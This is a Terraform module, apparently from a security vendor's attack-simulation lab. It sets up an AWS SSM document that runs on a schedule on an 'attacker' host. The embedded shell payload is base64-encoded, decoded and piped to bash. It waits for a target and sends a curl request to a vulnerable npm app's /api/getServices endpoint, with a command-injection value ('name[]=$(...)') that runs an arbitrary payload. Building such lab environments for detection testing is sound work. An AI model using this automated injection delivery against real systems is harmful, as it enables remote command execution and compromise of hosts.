locals {
    target_ip=var.target_ip
    target_port=var.target_port
    payload = <<-EOT
    LOGFILE=/tmp/ssm_attacker_exec_vuln_npm_app_attacker.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "payload: curl --get --verbose \"http://${local.target_ip}:${local.target_port}/api/getServices\" --data-urlencode 'name[]=\$(${var.payload})'"
    log "checking target: ${local.target_ip}:${local.target_port}"
    while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
        log "failed check - waiting for target";
        sleep 30;
    done;
    log "target available - sending payload";
    sleep 5;
    curl --get --verbose "http://${local.target_ip}:${local.target_port}/api/getServices" --data-urlencode 'name[]=$(${var.payload})' >> $LOGFILE 2>&1;
    echo "\n" >> $LOGFILE
    log "payload sent sleeping..."
    log "done";
    EOT
    base64_payload = base64encode(local.payload)
}

resource "aws_ssm_document" "exec_vuln_npm_app_attacker" {
  name          = "exec_vuln_npm_app_${var.environment}_${var.deployment}"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "start docker based vulnerable npm app exploit",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_vuln_npm_app_attacker_${var.environment}_${var.deployment}",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "600",
                    "runCommand": [
                        "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_vuln_npm_app_attacker" {
    name = "exec_vuln_npm_app_${var.environment}_${var.deployment}"

    resource_query {
        query = jsonencode(var.resource_query_exec_vuln_npm_app_attacker)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_vuln_npm_app_attacker" {
    association_name = "exec_vuln_npm_app_${var.environment}_${var.deployment}"

    name = aws_ssm_document.exec_vuln_npm_app_attacker.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_vuln_npm_app_attacker.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}